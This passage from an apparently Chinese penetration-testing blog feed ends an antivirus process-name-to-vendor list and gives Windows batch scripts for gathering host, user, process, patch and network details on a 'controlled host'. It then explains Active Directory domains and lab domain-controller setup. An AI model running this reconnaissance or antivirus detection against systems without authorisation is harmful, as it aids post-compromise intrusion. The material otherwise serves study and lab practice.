class="hljs-string">&quot;网游保镖&quot;</span>,<br><span class="hljs-string">&quot;GUARDNT.exe&quot;</span>: <span class="hljs-string">&quot;IKARUS&quot;</span>,<br><span class="hljs-string">&quot;IAMAPP.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;INOCIT.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;INORPC.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;INORT.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;INOTASK.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;INOUPTNG.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;ISAFE.exe&quot;</span>: <span class="hljs-string">&quot;eTrust&quot;</span>,<br><span class="hljs-string">&quot;KAV.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KAVMM.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KAVPF.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KAVPFW.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KAVSTART.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KAVSVC.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KAVSVCUI.exe&quot;</span>: <span class="hljs-string">&quot;Kaspersky&quot;</span>,<br><span class="hljs-string">&quot;KMAILMON.exe&quot;</span>: <span class="hljs-string">&quot;金山毒霸&quot;</span>,<br><span class="hljs-string">&quot;MCAGENT.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;MCMNHDLR.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;MCREGWIZ.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;MCUPDATE.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;MCVSSHLD.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;MINILOG.exe&quot;</span>: <span class="hljs-string">&quot;Zone Alarm&quot;</span>,<br><span class="hljs-string">&quot;MYAGTSVC.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;MYAGTTRY.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;NAVAPSVC.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NAVAPW32.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NAVLU32.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NAVW32.exe&quot;</span>: <span class="hljs-string">&quot;Norton Antivirus&quot;</span>,<br><span class="hljs-string">&quot;NEOWATCHLOG.exe&quot;</span>: <span class="hljs-string">&quot;NeoWatch&quot;</span>,<br><span class="hljs-string">&quot;NEOWATCHTRAY.exe&quot;</span>: <span class="hljs-string">&quot;NeoWatch&quot;</span>,<br><span class="hljs-string">&quot;NISSERV.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NISUM.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NMAIN.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NOD32.exe&quot;</span>: <span class="hljs-string">&quot;ESET NOD32&quot;</span>,<br><span class="hljs-string">&quot;NPFMSG.exe&quot;</span>: <span class="hljs-string">&quot;Norman个人防火墙&quot;</span>,<br><span class="hljs-string">&quot;NPROTECT.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;NSMDTR.exe&quot;</span>: <span class="hljs-string">&quot;Norton&quot;</span>,<br><span class="hljs-string">&quot;NTRTSCAN.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;OFCPFWSVC.exe&quot;</span>: <span class="hljs-string">&quot;OfficeScanNT&quot;</span>,<br><span class="hljs-string">&quot;ONLINENT.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;OP_MON.exe&quot;</span>: <span class="hljs-string">&quot; OutpostFirewall&quot;</span>,<br><span class="hljs-string">&quot;PAVFIRES.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVFNSVR.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVKRE.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVPROT.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVPROXY.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVPRSRV.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVSRV51.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PAVSS.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;PCCGUIDE.exe&quot;</span>: <span class="hljs-string">&quot;PC‐cillin&quot;</span>,<br><span class="hljs-string">&quot;PCCIOMON.exe&quot;</span>: <span class="hljs-string">&quot;PC‐cillin&quot;</span>,<br><span class="hljs-string">&quot;PCCNTMON.exe&quot;</span>: <span class="hljs-string">&quot;PC‐cillin&quot;</span>,<br><span class="hljs-string">&quot;PCCPFW.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;PCCTLCOM.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;PCTAV.exe&quot;</span>: <span class="hljs-string">&quot;PC Tools AntiVirus&quot;</span>,<br><span class="hljs-string">&quot;PERSFW.exe&quot;</span>: <span class="hljs-string">&quot;Tiny Personal Firewall&quot;</span>,<br><span class="hljs-string">&quot;PERVAC.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;PESTPATROL.exe&quot;</span>: <span class="hljs-string">&quot;Ikarus&quot;</span>,<br><span class="hljs-string">&quot;PREVSRV.exe&quot;</span>: <span class="hljs-string">&quot;熊猫卫士&quot;</span>,<br><span class="hljs-string">&quot;RTVSCN95.exe&quot;</span>: <span class="hljs-string">&quot;Real‐time Virus Scanner&quot;</span>,<br><span class="hljs-string">&quot;SAVADMINSERVICE.exe&quot;</span>: <span class="hljs-string">&quot;SAV&quot;</span>,<br><span class="hljs-string">&quot;SAVMAIN.exe&quot;</span>: <span class="hljs-string">&quot;SAV&quot;</span>,<br><span class="hljs-string">&quot;SAVSCAN.exe&quot;</span>: <span class="hljs-string">&quot;SAV&quot;</span>,<br><span class="hljs-string">&quot;SDHELP.exe&quot;</span>: <span class="hljs-string">&quot;Spyware Doctor&quot;</span>,<br><span class="hljs-string">&quot;SHSTAT.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;SPBBCSVC.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;SPIDERCPL.exe&quot;</span>: <span class="hljs-string">&quot;Dr.Web&quot;</span>,<br><span class="hljs-string">&quot;SPIDERML.exe&quot;</span>: <span class="hljs-string">&quot;Dr.Web&quot;</span>,<br><span class="hljs-string">&quot;SPIDERUI.exe&quot;</span>: <span class="hljs-string">&quot;Dr.Web&quot;</span>,<br><span class="hljs-string">&quot;SPYBOTSD.exe&quot;</span>: <span class="hljs-string">&quot;Spybot &quot;</span>,<br><span class="hljs-string">&quot;SWAGENT.exe&quot;</span>: <span class="hljs-string">&quot;SonicWALL&quot;</span>,<br><span class="hljs-string">&quot;SWDOCTOR.exe&quot;</span>: <span class="hljs-string">&quot;SonicWALL&quot;</span>,<br><span class="hljs-string">&quot;SWNETSUP.exe&quot;</span>: <span class="hljs-string">&quot;Sophos&quot;</span>,<br><span class="hljs-string">&quot;SYMLCSVC.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;SYMPROXYSVC.exe&quot;</span>: <span class="hljs-string">&quot;Symantec&quot;</span>,<br><span class="hljs-string">&quot;SYMSPORT.exe&quot;</span>: <span class="hljs-string">&quot;Sysmantec&quot;</span>,<br><span class="hljs-string">&quot;SYMWSC.exe&quot;</span>: <span class="hljs-string">&quot;Sysmantec&quot;</span>,<br><span class="hljs-string">&quot;SYNMGR.exe&quot;</span>: <span class="hljs-string">&quot;Sysmantec&quot;</span>,<br><span class="hljs-string">&quot;TMLISTEN.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;TMNTSRV.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;TMPROXY.exe&quot;</span>: <span class="hljs-string">&quot;趋势科技&quot;</span>,<br><span class="hljs-string">&quot;TNBUTIL.exe&quot;</span>: <span class="hljs-string">&quot;Anti‐Virus&quot;</span>,<br><span class="hljs-string">&quot;VBA32ECM.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;VBA32IFS.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;VBA32PP3.exe&quot;</span>: <span class="hljs-string">&quot;已知杀软进程,名称暂未收录&quot;</span>,<br><span class="hljs-string">&quot;VCRMON.exe&quot;</span>: <span class="hljs-string">&quot;VirusChaser&quot;</span>,<br><span class="hljs-string">&quot;VRMONNT.exe&quot;</span>: <span class="hljs-string">&quot;HAURI&quot;</span>,<br><span class="hljs-string">&quot;VRMONSVC.exe&quot;</span>: <span class="hljs-string">&quot;HAURI&quot;</span>,<br><span class="hljs-string">&quot;VSHWIN32.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;VSSTAT.exe&quot;</span>: <span class="hljs-string">&quot;McAfee&quot;</span>,<br><span class="hljs-string">&quot;XCOMMSVR.exe&quot;</span>: <span class="hljs-string">&quot;BitDefender&quot;</span>,<br><span class="hljs-string">&quot;ZONEALARM.exe&quot;</span>: <span class="hljs-string">&quot;Zone Alarm&quot;</span>,<br><span class="hljs-string">&quot;360rp.exe&quot;</span>: <span class="hljs-string">&quot;360杀毒&quot;</span>,<br><span class="hljs-string">&quot;afwServ.exe&quot;</span>: <span class="hljs-string">&quot; Avast Antivirus &quot;</span>,<br><span class="hljs-string">&quot;safeboxTray.exe&quot;</span>: <span class="hljs-string">&quot;360杀毒&quot;</span>,<br><span class="hljs-string">&quot;360safebox.exe&quot;</span>: <span class="hljs-string">&quot;360杀毒&quot;</span>,<br><span class="hljs-string">&quot;QQPCTray.exe&quot;</span>: <span class="hljs-string">&quot;QQ电脑管家&quot;</span>,<br><span class="hljs-string">&quot;KSafeTray.exe&quot;</span>: <span class="hljs-string">&quot;金山毒霸&quot;</span>,<br><span class="hljs-string">&quot;KSafeSvc.exe&quot;</span>: <span class="hljs-string">&quot;金山毒霸&quot;</span>,<br><span class="hljs-string">&quot;KWatch.exe&quot;</span>: <span class="hljs-string">&quot;金山毒霸&quot;</span>,<br><span class="hljs-string">&quot;gov_defence_service.exe&quot;</span>: <span class="hljs-string">&quot;云锁&quot;</span>,<br><span class="hljs-string">&quot;gov_defence_daemon.exe&quot;</span>: <span class="hljs-string">&quot;云锁&quot;</span>,<br><span class="hljs-string">&quot;smartscreen.exe&quot;</span>: <span class="hljs-string">&quot;Windows Defender&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-bat脚本自动化信息收集"><a href="#2-bat脚本自动化信息收集" class="headerlink" title="2.bat脚本自动化信息收集"></a>2.bat脚本自动化信息收集</h2><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs dos"><span class="hljs-built_in">echo</span> 表示显示此命令后的字符<br><span class="hljs-built_in">echo</span> off 表示在此语句后所有运行的命令都不显示命令行本身<br>@与<span class="hljs-built_in">echo</span> off相象，但它是加在每个命令行的最前面，表示运行时不显示这一行的命令行（只能影响当前<br>行）。<br><span class="hljs-keyword">call</span> 调用另一个批处理文件（如果不用<span class="hljs-keyword">call</span>而直接调用别的批处理文件，那么执行完那个批处理文件后将无<br>法返回当前文件并执行当前文件的后续命令）。<br><span class="hljs-built_in">pause</span> 运行此句会暂停批处理的执行并在屏幕上显示Press any key to continue...的提示，等待用<br>户按任意键后继续<br><span class="hljs-comment">rem 表示此命令后的字符为解释行（注释），不执行，只是给自己今后参考用的（相当于程序中的注释）。</span><br>@<span class="hljs-built_in">echo</span> off 不显示后续命令行及当前命令行<br><span class="hljs-built_in">dir</span> c:\*.* &gt;a.txt 将c盘文件列表写入a.txt<br><span class="hljs-keyword">call</span> c:\ucdos\ucdos.bat 调用ucdos<br><span class="hljs-built_in">echo</span> 你好 显示&quot;你好&quot;<br><span class="hljs-built_in">pause</span> 暂停,等待按键继续<br><span class="hljs-comment">rem 准备运行wps 注释：准备运行wps</span><br><span class="hljs-built_in">cd</span> ucdos 进入ucdos目录<br>wps 运行wps<br><span class="hljs-built_in">echo</span> <span class="hljs-number">123</span> &gt;<span class="hljs-number">1</span>.txt 输出<span class="hljs-number">123</span>到<span class="hljs-number">1</span>.txt<br><span class="hljs-built_in">echo</span> <span class="hljs-number">456</span> &gt;&gt;<span class="hljs-number">1</span>.txt 追加<span class="hljs-number">456</span>到<span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure><img src="/img/image-20231006100752009.png" alt="image-20231006100752009" style="zoom: 80%;" /><img src="/img/image-20231006101110931.png" alt="image-20231006101110931" style="zoom:80%;" /><img src="/img/image-20231006101457455.png" alt="image-20231006101457455" style="zoom: 80%;" /><h3 id="信息收集bat脚本"><a href="#信息收集bat脚本" class="headerlink" title="信息收集bat脚本"></a>信息收集bat脚本</h3><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs clean">@echo off<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>ipconfig &gt;&gt;<span class="hljs-number">1.</span>txt<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>systeminfo | findstr /B /C:<span class="hljs-string">&quot;OS Name&quot;</span> /C:<span class="hljs-string">&quot;OS Version&quot;</span> &gt;&gt;<span class="hljs-number">1.</span>txt<br>systeminfo| findstr /B /C:<span class="hljs-string">&quot;OS 名称&quot;</span> /C:<span class="hljs-string">&quot;OS 版本&quot;</span> &gt;&gt;<span class="hljs-number">1.</span>txt<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>echo %PROCESSOR_ARCHITECTURE% &gt;&gt;<span class="hljs-number">1.</span>txt<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>wmic process list brief &gt;&gt; <span class="hljs-number">1.</span>txt<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>wmic useraccount get name,SID &gt;&gt; <span class="hljs-number">1.</span>txt<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>netstat ‐ano &gt;&gt; <span class="hljs-number">1.</span>txt<br>echo ############################## &gt;&gt;<span class="hljs-number">1.</span>txt<br>netsh firewall show state &gt;&gt; <span class="hljs-number">1.</span>txt<br></code></pre></td></tr></table></figure><p>文件上传到被控主机然后执行即可</p><img src="/img/image-20231006102628465.png" alt="image-20231006102628465" style="zoom:67%;" /><p>生成html的脚本</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">for</span> /f &quot;delims=&quot; %%A <span class="hljs-keyword">in</span> (<span class="hljs-string">&#x27;dir /s /b %WINDIR%\system32\*htable.xsl&#x27;</span>) <span class="hljs-keyword">do</span> <span class="hljs-keyword">set</span> &quot;var=%%A&quot;<br>wmic process <span class="hljs-keyword">get</span> CSName,Description,ExecutablePath,ProcessId /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic service <span class="hljs-keyword">get</span> Caption,<span class="hljs-type">Name</span>,PathName,ServiceType,Started,StartMode,StartName /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic USERACCOUNT list <span class="hljs-keyword">full</span> /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic <span class="hljs-keyword">group</span> list <span class="hljs-keyword">full</span> /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic nicconfig <span class="hljs-keyword">where</span> IPEnabled=<span class="hljs-string">&#x27;true&#x27;</span> <span class="hljs-keyword">get</span> Caption,DefaultIPGateway,Description,DHCPEnabled,DHCPServer,IPAddress,IPSubnet,MACAddress /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic volume <span class="hljs-keyword">get</span> Label,DeviceID,DriveLetter,FileSystem,Capacity,FreeSpace /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic netuse list <span class="hljs-keyword">full</span> /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic qfe <span class="hljs-keyword">get</span> Caption,Description,HotFixID,InstalledOn /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic startup <span class="hljs-keyword">get</span> Caption,Command,<span class="hljs-keyword">Location</span>,<span class="hljs-keyword">User</span> /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic PRODUCT <span class="hljs-keyword">get</span> Description,InstallDate,InstallLocation,PackageCache,Vendor,<span class="hljs-keyword">Version</span> /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic os <span class="hljs-keyword">get</span> <span class="hljs-type">name</span>,<span class="hljs-keyword">version</span>,InstallDate,LastBootUpTime,LocalDateTime,Manufacturer,RegisteredUse<br>r,ServicePackMajorVersion,SystemDirectory /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br>wmic Timezone <span class="hljs-keyword">get</span> DaylightName,Description,StandardName /<span class="hljs-keyword">format</span>:&quot;%var%&quot; &gt;&gt; <span class="hljs-keyword">out</span>.html<br></code></pre></td></tr></table></figure><img src="/img/image-20231006103026557.png" alt="image-20231006103026557" style="zoom: 50%;" />]]></content>
    
    
    <categories>
      
      <category>后渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>内网基础-域环境</title>
    <link href="/2023/10/27/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%9F%9F%E7%8E%AF%E5%A2%83/"/>
    <url>/2023/10/27/%E5%86%85%E7%BD%91%E5%9F%BA%E7%A1%80-%E5%9F%9F%E7%8E%AF%E5%A2%83/</url>
    
    <content type="html"><![CDATA[<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><h2 id="1-域介绍"><a href="#1-域介绍" class="headerlink" title="1.域介绍"></a>1.域介绍</h2><p>​Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。 </p><p>​域 (Domain)是一个有安全边界的计算机集合(安全边界的意思是,在两个域中,一个域中的用户无法 访问另一个域中的资源)可以简单地把域理解成升级版的工作组。与工作组相比,域的安全管理控制机制更加严格。用户要想访问域内的资源,必须以合法的身份登录域,而用户对域内的资源拥有什么样的权限,还取决于用户在域内的身份。 </p><p>​<strong>域控制器(Domain Controller,DC)<strong>是域中的一台类似</strong>管理服务器</strong>的计算机。域<strong>控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库</strong>。当计算 机连接 到域时,域控制器首先要鉴别这台计算机是否属于这个域,以及用户使用的登录账号是否存在、密码是否正确。如果以上信息有一项不正确,域控制器就会拒绝这个用户通过这台计算机登录。如果用户不 能登录,就不能访问服务器中的资源。 </p><p>​<strong>域控制器是整个域的通信枢纽,所有的权限身份验证都在域控制器上进行,也就是说,域内所有用来验证身份的账号和密码散列值都保存在域控制器中。</strong></p><h3 id="单域"><a href="#单域" class="headerlink" title="单域"></a>单域</h3><p>​通常,在一个地理位置固定的小公司里,建立一个域就可以满足需求。在一个域内,一般要有至少两台域服务器,一台作为DC,另一台作为备份DC</p><img src="/img/image-20230831203239480.png" alt="image-20230831203239480" style="zoom:50%;" /><h3 id="父域和子域"><a href="#父域和子域" class="headerlink" title="父域和子域"></a>父域和子域</h3><p>​出于管理及其他需求,需要在网络中划分多个域。<strong>第一个域称为父域,各分部的域称为该域的子域</strong>。例如大公司的各个分公司位于不同的地点,就需要使用父域及子域。如果把不同地点的分公司放在同一 个域内,那么它们之间在信息交互(包括同步、复制等)上花费的时间就会比较长,占用的带宽也会比较大(在同一个域内,信息交互的条目是很多的,而且不会压缩; 在不同的域之间,信息交互的条日相对较少, 而且可以压缩)。这样处理有一个好处,就是分公司可以通过自己的域来管理自己的资源。还有一种情况是出于安全策略的考虑(每个域都有自己的 安全策略)例如,一个公司的财务部希望使用特定的安全策略(包括账号密码策略等)、那么可以将财务部作为一个子域来单独管理。</p><h3 id="域树"><a href="#域树" class="headerlink" title="域树"></a>域树</h3><p>​<strong>域树(Tree)是多个域通过建立信任关系组成的集合</strong>。一个域管理员只能管理本域,不能访问或者管理其他域。<strong>如果两个域之间需要互相访问,则需要建立信任关系</strong>，信任关系是连接不同域的桥梁。域树内的父域与子域,不但可以按照需要互相管理、还可以跨网络分配文件和打印机等设备及资源,从而在 不同的域之间实现网络资源的共享与管理、通信及数据传输</p><p>​在一个域树中,父域可以包含多个子域。子域是相对父域来说的,指的是域名中的每一个段。 各子域之间用点号隔开,一个”.”代表一个层次。放在域名最后的子域称为最高级子域或一级域,它前面的子域为二级域</p><img src="/img/image-20230831203501528.png" alt="image-20230831203501528" style="zoom:50%;" /><h3 id="域森林"><a href="#域森林" class="headerlink" title="域森林"></a>域森林</h3><p>​<strong>域森林( Forest)是指多个域树通过建立信任关系组成的集合</strong>。</p><p>​例如,在一个公司兼并场景中某公司使 用域树 abc. com,被兼并的公司本来有自己的域树abc. net, 域树abc.net无法挂在域树abc.com下。 所以,域树abc.com与域树 abc. net之间需要通过建立信任关系来构成域森林。通过域树之间的信任 关系,可以管理和使用整个域森林中的资源,并保留被兼并公司自身原有的特性</p><p><img src="/img/image-20230831203609752.png" alt="image-20230831203609752"></p><h3 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h3><p>​域名服务器(Domain Name Server,DNs)是指用于实现域名( Domain Name)和与之相对的IP地址( IP Address)转换的服务器。从对域树的介绍中可以看出,域树中的域名和DNS域名非常相似。而实际上,因为域中的计算机是使用DNS来定位域控制器、服务器及其他计算机、网络服务的,所以域的名字就是DNS域的名字。在内网渗透测试中,大都是通过寻找DNS服务器来确定域控制器的位置的(<strong>DNS 服务器和域控制器通常配置在同一机器上</strong>)</p><h2 id="2-域环境搭建"><a href="#2-域环境搭建" class="headerlink" title="2.域环境搭建"></a>2.域环境搭建</h2><table><thead><tr><th>机器</th><th>ip</th></tr></thead><tbody><tr><td>WindowsServer 2012 R2（域控）</td><td>10.210.100.10（静态）</td></tr><tr><td>WindowsServer 2008 R2（域内主机）</td><td>10.210.100.20（可设置为静态 也可动态）</td></tr><tr><td>WindowsServer 2003 R2（域内主机）</td><td>10.210.100.30</td></tr></tbody></table><h3 id="winserver2012配置"><a href="#winserver2012配置" class="headerlink" title="winserver2012配置"></a>winserver2012配置</h3><h4 id="1-修改为静态ip"><a href="#1-修改为静态ip" class="headerlink" title="1.修改为静态ip"></a>1.修改为静态ip</h4><img src="/img/image-20231001152825110.png" alt="image-20231001152825110" style="zoom: 50%;" /><img src="/img/image-20231001152922249.png" alt="image-20231001152922249" style="zoom:67%;" /><h4 id="2-更改计算机名为DC"><a href="#2-更改计算机名为DC" class="headerlink" title="2.更改计算机名为DC"></a>2.更改计算机名为DC</h4><img src="/img/image-20231001153131681.png" alt="image-20231001153131681" style="zoom:50%;" /><h4 id="3-安装域控制器和DNS服务"><a href="#3-安装域控制器和DNS服务" class="headerlink" title="3.安装域控制器和DNS服务"></a>3.安装域控制器和DNS服务</h4><p>单击【添加角色和功能】选项,进入添加角色和功能向导界面。在【开始之前】部分, 本保持默认设置。单击下一步按钮,进入【安装类型】部分,选择基于角色或者基于功能的 安装选项。单击下一步按 钮,进入【服务器选择】部分。目前,在服务器池中只有当前这 台机器,保持默认设置。单击下一步按 钮,在【服务器角色】部分勾选【 Active Directory域 服务】和【DNS服务器】复选框</p><img src="/img/image-20231001154041453.png" alt="image-20231001154041453" style="zoom: 50%;" /><p>在”功能”界面保持默认设置,单击”下一步”按钮,进人”确认”部分。确认需要安装的组件,勾选”如果需 要,自动重新启动目标服务器”复选框,,然后单击”安装” 按钮</p><img src="/img/image-20231001154324378.png" alt="image-20231001154324378" style="zoom: 50%;" /><h4 id="4-升级服务器"><a href="#4-升级服务器" class="headerlink" title="4.升级服务器"></a>4.升级服务器</h4><img src="/img/image-20231001154549952.png" alt="image-20231001154549952" style="zoom:50%;" /><img src="/img/image-20231001154708915.png" alt="image-20231001154708915" style="zoom:50%;" /><p>在【域控制器选项】部分,将林功能级别、域功能级别都设置为” WindowsServer2012R2”,创建域林 时,在默认情况下应选择DNS服务器,林中的第一个域控制器必须是全局目录服务器且不能是只读域控 制器(RODC)。然后,设置目录服务还原模式的密码(在开机 进入安全模式修复活动目录数据库时将使用此密码</p><img src="/img/image-20231001154942973.png" alt="image-20231001154942973" style="zoom:50%;" /><p>在【DNS选项】部分会出现关于DNS的警告。不用理会该警告,保持默认设置。单击”下一步”按钮,进入”其他选项”部分。在”NetBIOS域名”(不支持DNS域名的旧版本操作系统,例如Windows98、NT,需 要通过NetBIOs域名进行通信)部分保持默认设置。单击”下一步”按钮,进人”路径”部分,指定数据库、 日志、SYSVOL文件夹的位置,其他选项保持默认设置。单击”下一步”按钮,保持默认设置。单击”下一 步”按钮,最后单击”安装按钮。安装后,需要重新启动服务器，最后升级为域控</p><img src="/img/image-20231001155107024.png" alt="image-20231001155107024" style="zoom:50%;" /><p>检查通过 安装即可</p><img src="/img/image-20231001155158361.png" alt="image-20231001155158361" style="zoom:50%;" /><p>安装完成后会重启计算机  设置成功后会新增一些管理工具</p><img src="/img/image-20231001160052275.png" alt="image-20231001160052275" style="zoom:67%;" /><h4 id="5-创建用户"><a href="#5-创建用户" class="headerlink" title="5.创建用户"></a>5.创建用户</h4><p>点击AD用户和计算机管理 来到hack.com–&gt;Users–&gt;右键新建用户</p><img src="/img/image-20231001160531301.png" alt="image-20231001160531301" style="zoom:67%;" /><p>设置密码永不过期</p><img src="/img/image-20231001160647259.png" alt="image-20231001160647259" style="zoom:50%;" /><img src="/img/image-20231001160742122.png" alt="image-20231001160742122" style="zoom:50%;" /><h3 id="将机器winserver2008加入域"><a href="#将机器winserver2008加入域" class="headerlink" title="将机器winserver2008加入域"></a>将机器winserver2008加入域</h3><p>配置为静态ip10.210.100.20   设置DNS服务器地址为winserver2012</p><img 